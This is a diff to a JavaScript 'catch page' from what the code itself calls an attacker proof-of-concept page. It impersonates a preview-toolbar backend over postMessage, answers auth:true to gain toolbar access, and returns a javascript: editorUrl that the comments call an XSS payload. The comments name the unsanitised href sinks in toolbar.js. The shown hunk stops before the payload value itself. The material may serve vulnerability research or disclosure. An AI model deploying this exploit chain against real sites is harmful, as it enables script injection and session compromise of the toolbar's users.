@@ -18,19 +18,31 @@
 const SETUP_PORT = 'setup_port';
 const READY = 'ready';
 
+// Report status to top window (attacker PoC page) for debugging
+function report(msg) {
+  try { window.top.postMessage({type:'catch_status', msg: msg}, '*'); } catch(e) {}
+}
+report('Catch page loaded! Waiting for setup_port...');
+
 window.addEventListener('message', function(e) {
+  // Log ALL messages for debugging
+  report('Got message: ' + JSON.stringify(e.data).substring(0, 100) + ' ports=' + (e.ports ? e.ports.length : 0));
+
   if (e.data === SETUP_PORT && e.ports && e.ports.length > 0) {
     const port = e.ports[0];
+    report('setup_port RECEIVED! Port established.');
 
     // Acknowledge — parent's establishConnection() resolves on 'ready'
     port.postMessage(READY);
 
     port.onmessage = function(msg) {
       const { type, data } = msg.data;
+      report('Port msg: type=' + type);
 
       switch(type) {
 
         case 'preview_state':
+          report('→ Responding auth:true');
           // auth:true → enables toolbar UI + prediction handler
           // preview:null → avoids cookie-based reload loop
           port.postMessage({
@@ -44,6 +56,7 @@ window.addEventListener('message', function(e) {
           break;
 
         case 'prediction_docs':
+          report('→ Responding with javascript: editorUrl (XSS payload)');
           // SINK: editorUrl → <a href={t.editorUrl}> in toolbar.js:7461
           //        t.url    → <a href={t.url}>       in toolbar.js:4626
           // No protocol validation. No sanitization. javascript: fires on click.
